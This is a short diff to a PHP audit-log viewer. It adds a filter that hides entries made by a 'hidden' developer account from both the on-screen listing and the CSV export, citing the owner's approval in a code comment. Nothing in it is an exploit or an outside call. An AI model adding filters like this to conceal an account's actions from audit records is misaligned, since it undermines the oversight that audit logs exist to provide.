@@ -23,7 +23,9 @@ $offset        = ($page - 1) * $per_page;
 
 // Build query
 // Display is always limited to the last 7 days; use Export CSV for older records
-$where   = ["a.created_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)"];
+// The developer account's entries are kept in the database but not listed (owner's approval 2026-10-07)
+$hidden_actor_sql = '(a.user_id IS NULL OR a.user_id NOT IN (SELECT user_id FROM users WHERE is_hidden = 1))';
+$where   = ["a.created_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)", $hidden_actor_sql];
 $params  = [];
 $types   = '';
 
@@ -87,7 +89,7 @@ if (isset($_GET['export']) && $_GET['export'] === 'csv') {
     $exp_today       = date('Y-m-d');
 
     // Build export-specific where — keep user/action/search filters, override date range
-    $exp_where  = ['a.created_at >= ?', 'a.created_at <= ?'];
+    $exp_where  = ['a.created_at >= ?', 'a.created_at <= ?', $hidden_actor_sql];
     $exp_params = [$exp_month_start . ' 00:00:00', $exp_today . ' 23:59:59'];
     $exp_types  = 'ss';
 
